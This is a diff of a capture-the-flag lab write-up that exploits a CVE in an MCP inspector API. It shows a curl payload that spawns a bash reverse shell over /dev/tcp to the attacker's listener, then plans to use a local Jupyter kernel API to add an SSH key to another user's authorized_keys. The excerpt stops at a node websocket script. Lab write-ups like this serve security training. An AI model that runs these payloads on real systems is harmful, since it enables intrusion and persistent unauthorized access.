@@ -41,10 +41,13 @@ Open 10.129.59.57:6274
 - [POC for the CVE](https://github.com/advisories/GHSA-232v-j27c-5pp6)
 
 - so i tried to get the revshell with this payload (modified this wrt to the above)
+
+
 ```bash
   curl -X POST http://10.129.59.57:6274/api/mcp/connect   -H "Content-Type: application/json"   -d '{"serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.14.167/4444 0>&1"],"env":{}},"serverId":"reee"}'
 
 ```
+
 
 ```bash
 stapat@stapat:~$ nc -lvnp 4444
@@ -61,20 +64,25 @@ mcp-dev
 - there is a jupyter enviroment running
 - so we know Jupyter kernels execute code as the notebook owner(analyst)
 - and  REST API on 127.0.0.1:8888 is reachable from our shell
-- 
+
+
 ```bash
 ps aux | grep analyst
 analyst     1082  0.0  2.7 269580 109136 ?       Ssl  16:50   0:08 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=REDACTED --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
 ```
 
+
 - now we'll create a notebook session through the jupyter API -> get a valid kernel ID from the response -> send a jupyter execute_request message over websocket -> append your SSH key to authorized_keys of analyst
+
 
 ```bash
 mcp-dev@devhub:~$ which node
 which node
 /usr/bin/node
 ```
+
 - we have node so we'll use node's websocket for this
+
 
 ```bash
 cat > ws.js << 'EOF'
